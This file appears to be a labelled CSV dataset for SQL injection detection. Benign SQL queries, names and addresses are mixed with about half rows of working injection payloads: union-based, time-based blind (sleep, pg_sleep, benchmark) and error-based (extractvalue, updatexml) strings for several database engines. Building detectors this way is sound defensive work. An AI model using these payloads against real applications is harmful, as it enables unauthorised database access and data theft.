Sentence,Label,Processed_Sentence
"1'  )   where 1625  =  1625 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1.0,"0'  )   where 0  =  0 and 0  =    (  select count  (  *  )   from sysibm.systables as t0,sysibm.systables as t0,sysibm.systables as t0  )  --"
38747118f,0.0,0f
"-6126 union all select 8486,8486,8486,8486,8486,8486,8486,8486,8486--",1.0,"-0 union all select 0,0,0,0,0,0,0,0,0--"
"-1171' union all select 3958,3958,3958,3958,3958--",1.0,"-0' union all select 0,0,0,0,0--"
-6233'  )   where 9820  =  9820 or 3038  =  3038,1.0,-0'  )   where 0  =  0 or 0  =  0
1'+  (  select uhsy where 4596  =  4596 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   +',1.0,0'+  (  select uhsy where 0  =  0 and   (  select * from   (  select  (  sleep  (  0   )    )     )  fzno   )    )   +'
SELECT * FROM needle WHERE fog IN  ( SELECT darkness FROM appearance ) ,0.0,select * from needle where fog in  ( select darkness from appearance ) 
"  SELECT spiderID AS ID, late AS also FROM win",0.0,"  select spiderid as id, late as also from win"
1'+  (  select 'cwta' where 6091  =  6091,1.0,0'+  (  select 'cwta' where 0  =  0
"1'  )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1.0,"0'  )   and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )  "
"1""  )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc",1.0,"0""  )    (  select   (  case when   (  0  =  0  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  0  )  ||char  (  0  )  ||char  (  0  )  ,null  )  ,0  )  ,0  )  ,null  )   else char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )   end  )   from   (  values  (  0   )    )     )   and   (  ""xhqc""  =  ""xhqc"
SELECT * FROM southern WHERE should NOT LIKE 'ourselves%',0.0,select * from southern where should not like 'ourselves%'
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1.0,"-0' where 0  =  0 or elt  (  0  =  0,0  )  --"
"1""  )   as ebvt where 5305  =  5305",1.0,"0""  )   as ebvt where 0  =  0"
"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",1.0,"0"" where 0  =  0 or 0  =    (  select 0 from pg_sleep  (  0   )    )   --"
"1%""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1.0,"0%""   )    )    or char  (  0  )  ||char  (  0  )  ||char  (  0  )  ||char  (  0  )    =  regexp_substring  (  repeat  (  right  (  char  (  0  )  ,0  )  ,0  )  ,null  )  --"
SELECT * FROM particular,0.0,select * from particular
SELECT * FROM type WHERE thirty = 'air'  OR proud = 'dog',0.0,select * from type where thirty = 'air'  or proud = 'dog'
1%'   )    )    and 7160  =  7249--,1.0,0%'   )    )    and 0  =  0--
"1%' union all select null,null,null,null,null,null,null#",1.0,"0%' union all select null,null,null,null,null,null,null#"
"INSERT INTO column ( white, does, certain, curious, first, our )  VALUES  ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )  ",0.0,"insert into column ( white, does, certain, curious, first, our )  values  ( 'rose', 'anyone'. close', 'remove', 'force', 'feet', 'fell' )  "
SELECT * FROM stay ORDER BY kind DESC,0.0,select * from stay order by kind desc
"1""  )   where 1699  =  1699 or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0""  )   where 0  =  0 or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
SELECT * FROM key WHERE Price NOT BETWEEN 10 AND 20,0.0,select * from key where price not between 0 and 0
SELECT * FROM against ORDER BY sky DESC,0.0,select * from against order by sky desc
ga27393,0.0,ga0
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and   (  ""%""  =  """,1.0,"select dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   from dual and   (  ""%""  =  """
-4637' or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  ) ,1.0,-0' or 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  ) 
SELECT TOP 50 PERCENT * FROM remarkable SELECT * FROM ten FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM those,0.0,select top 0 percent * from remarkable select * from ten fetch first 0 percent rows onlyselect top 0 * from those
-6039%'   )    )    or 6872  =  6872 and    (    (   '%'  =  ',1.0,-0%'   )    )    or 0  =  0 and    (    (   '%'  =  '
ch61c795,0.0,ch0c0
"  SELECT Orders.welcomerID, Employees.uncle, Employees.somebody FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.directlyID ORDER BY Orders.wifeID",0.0,"  select orders.welcomerid, employees.uncle, employees.somebody from ordersright join employees on orders.employeeid  =  employees.directlyid order by orders.wifeid"
SELECT lot ( s )  FROM escape,0.0,select lot ( s )  from escape
SELECT AVG ( climb ) FROM lovely,0.0,select avg ( climb ) from lovely
28%,1.0,0%
SELECT * FROM sea WHERE being = 'sugar' FETCH FIRST 3 ROWS ONLY,0.0,select * from sea where being = 'sugar' fetch first 0 rows only
"-5672'   )    )    union all select 9371,9371,9371,9371,9371,9371--",1.0,"-0'   )    )    union all select 0,0,0,0,0,0--"
"1""  )   where 6679  =  6679 rlike sleep  (  5  )  #",1.0,"0""  )   where 0  =  0 rlike sleep  (  0  )  #"
1 where 8214  =  8214 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1.0,0 where 0  =  0 and 0  =  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric  )  --
kazuo,0.0,kazuo
"-7559"" or 8792  =  6905--",1.0,"-0"" or 0  =  0--"
"1%""   )    )     )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1.0,"0%""   )    )     )   procedure analyse  (  extractvalue  (  0,concat  (  0x0c,  (  benchmark  (  0,md0  (  0x0b0c0   )    )      )    )     )  ,0  )  #"
-6165%'   )    )    union all select 5384#,1.0,-0%'   )    )    union all select 0#
"-5143'+  (  select 'zyrr' where 8405  =  8405 union all select 8405,8405,8405,8405#",1.0,"-0'+  (  select 'zyrr' where 0  =  0 union all select 0,0,0,0#"
SELECT before FROM know UNION SELECT fifty FROM learn ORDER BY every,0.0,select before from know union select fifty from learn order by every
1   )    )    order by 1#,1.0,0   )    )    order by 0#
aristin,0.0,aristin
"-3587'  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'psqt' like 'psqt",1.0,"-0'  )   or 0  =  ctxsys.drithsx.sn  (  0,  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end  )   from dual  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )     )   and   (  'psqt' like 'psqt"
"c/ veinat de cerdanyola, 3 6e",0.0,"c/ veinat de cerdanyola, 0 0e"
"  (  select concat  (  0x7171706a71,  (  select   (  elt  (  7381  =  7381,1   )    )     )  ,0x717a767a71   )    )   ",1.0,"  (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )   "
"  UPDATE shorter SET am =  'forgot', City =  'mysterious' WHERE height =  away",0.0,"  update shorter set am =  'forgot', city =  'mysterious' where height =  away"
1'  )   where 2928  =  2928,1.0,0'  )   where 0  =  0
SELECT * FROM upward WHERE each NOT LIKE 'moving%',0.0,select * from upward where each not like 'moving%'
" or benchmark  (  10000000,MD5  (  1   )    )   #",1.0," or benchmark  (  0,md0  (  0   )    )   #"
SELECT * FROM if  WHERE cage = military,0.0,select * from if  where cage = military
huaranga chicon,0.0,huaranga chicon
72523597c,0.0,0c
4433400000000000,0.0,0
pernign,0.0,pernign
SELECT dress ( s )  FROM fence FULL OUTER JOIN,0.0,select dress ( s )  from fence full outer join
1'+  (  select 'wyed' where 9896  =  9896,1.0,0'+  (  select 'wyed' where 0  =  0
SELECT COUNT ( sent )  FROM closely,0.0,select count ( sent )  from closely
SELECT AVG ( cow ) FROM born,0.0,select avg ( cow ) from born
SELECT Count ( * )  AS problem,0.0,select count ( * )  as problem
"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",1.0,"0""  )   or 0  =  dbms_pipe.receive_message  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ,0  )   and   (  ""dwpa""  =  ""dwpa"
"quevedo y quintana s/n, 4-h",0.0,"quevedo y quintana s/n, 0-h"
hermindo,0.0,hermindo
1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,1.0,0 or   (  select * from   (  select  (  sleep  (  0   )    )     )  ydpu  ) 
overman@saavedradiaz.travel,0.0,overman@saavedradiaz.travel
sempronia,0.0,sempronia
"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",1.0,"0'  )   or row  (  0,0  )  >  (  select count  (  *  )  ,concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,floor  (  rand  (  0  )  *0   )    )   x from   (  select 0 union select 0 union select 0 union select 0  )  a group by x  )   and   (  'xzlx' like 'xzlx"
488u7ra,0.0,0u0ra
"1""  )   as ivuv where 5691  =  5691",1.0,"0""  )   as ivuv where 0  =  0"
addons,0.0,addons
espaldilla,0.0,espaldilla
piols padilla,0.0,piols padilla
"1%"" and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and ""%""  =  """,1.0,"0%"" and extractvalue  (  0,concat  (  0x0c,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0   )    )    and ""%""  =  """
SELECT * FROM vowel  WHERE layers NOT LIKE '[nearby]%',0.0,select * from vowel  where layers not like '[nearby]%'
-4960'  )   union all select 5300--,1.0,-0'  )   union all select 0--
"1%'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   '%'  =  '",1.0,"0%'   )    )    and   (  select 0*  (  if   (    (   select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   s  )  , 0, 0   )    )     )   and    (    (   '%'  =  '"
nogueira de ramun,0.0,nogueira de ramun
" end and    (    (   ""%""  =  """,1.0," end and    (    (   ""%""  =  """
 (  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  7992  =  7992  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric   )    ) ,1.0, (  cast   (    (   chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )   ||  (  select   (  case when   (  0  =  0  )   then 0 else 0 end   )    )   ::text||  (  chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0  )  ||chr  (  0   )    )    as numeric   )    ) 
FROM  ( SELECT DISTINCT species FROM identity ) ,0.0,from  ( select distinct species from identity ) 
"INSERT INTO remain ( disappear, drawn, bite, number, rough, please )  VALUES  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  ",0.0,"insert into remain ( disappear, drawn, bite, number, rough, please )  values  ( 'fifteen', 'dance'. seed', 'lack', 'period', 'ten', 'task' )  "
"  SELECT Customers.CustomerName, Orders.OrderID FROM Customers LEFT JOIN Orders ON Customers.CustomerID  =  Orders.CustomerID ORDER BY Customers.CustomerName;",0.0,"  select customers.customername, orders.orderid from customers left join orders on customers.customerid  =  orders.customerid order by customers.customername;"
-8639  )   or 8138  =  6252,1.0,-0  )   or 0  =  0
SELECT * FROM biggest WHERE NOT gift = 'audience'  AND NOT my = 'angry',0.0,select * from biggest where not gift = 'audience'  and not my = 'angry'
harvison,0.0,harvison
"1   )    )    union all select null,null,null,null,null,null,null,null,null--",1.0,"0   )    )    union all select null,null,null,null,null,null,null,null,null--"
"1   )    )    or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   and    (    (   8965  =  8965",1.0,"0   )    )    or updatexml  (  0,concat  (  0x0e,0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0  )  ,0  )   and    (    (   0  =  0"
"1  )   union all select null,null,null,null,null,null,null#",1.0,"0  )   union all select null,null,null,null,null,null,null#"
"-1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz",1.0,"-0' or elt  (  0  =  0,0  )   and 'zkuz'  =  'zkuz"
 (  ||6  ) ,1.0, (  ||0  ) 
SELECT COUNT ( park ) FROM hang,0.0,select count ( park ) from hang
"-1512 union all select 9013,9013,9013,9013#",1.0,"-0 union all select 0,0,0,0#"
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 292420 )  ORDER BY meta_id ASC",0.0,"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 0 )  order by meta_id asc"
"1""  )   as ronb where 9368  =  9368",1.0,"0""  )   as ronb where 0  =  0"
SELECT AVG ( Price ) FROM skill,0.0,select avg ( price ) from skill
"1',  (  select   (  case when   (  7711  =  7711  )   then 1 else 7711*  (  select 7711 from information_schema.character_sets  )   end   )    )   ",1.0,"0',  (  select   (  case when   (  0  =  0  )   then 0 else 0*  (  select 0 from information_schema.character_sets  )   end   )    )   "
SELECT * FROM naturally,0.0,select * from naturally
"1'   )    )    union all select null,null,null,null,null,null,null,null--",1.0,"0'   )    )    union all select null,null,null,null,null,null,null,null--"
"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm",1.0,"0'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x0a0,  (  select   (  elt  (  0  =  0,0   )    )     )  ,0x0a0a0,0x0   )    )   x   )    )    and    (    (   'tnfm' like 'tnfm"
4279650000000000,0.0,0
"c/ maestro faus, 77, 13?f",0.0,"c/ maestro faus, 0, 0?f"
16610,0.0,0
SELECT * FROM nine WHERE split BETWEEN '1996-07-01' AND '1996-07-31',0.0,select * from nine where split between '0-0-0' and '0-0-0'
dueas cristaldo,0.0,dueas cristaldo
deiadrel,0.0,deiadrel
1   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   9288  =  9288,1.0,0   )    )    and 0  =    (  select 0 from pg_sleep  (  0   )    )    and    (    (   0  =  0
tors,0.0,tors
1'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,1.0,0'  )   and 0  =    (  'qqpjq'||  (  select case 0 when 0 then 0 else 0 end from rdb$database  )  ||'qzvzq'  ) 
"1"" or 4915  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",1.0,"0"" or 0  =    (  select count  (  *  )   from domain.domains as t0,domain.columns as t0,domain.tables as t0  )  --"
"1""  )   where 8407  =  8407 and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1.0,"0""  )   where 0  =  0 and 0  =    (  select count  (  *  )   from rdb$fields as t0,rdb$types as t0,rdb$collations as t0,rdb$functions as t0  )  --"
hervs,0.0,hervs
1 union all select null--,1.0,0 union all select null--
SELECT * FROM instance WHERE planet  BETWEEN 10 AND 20,0.0,select * from instance where planet  between 0 and 0
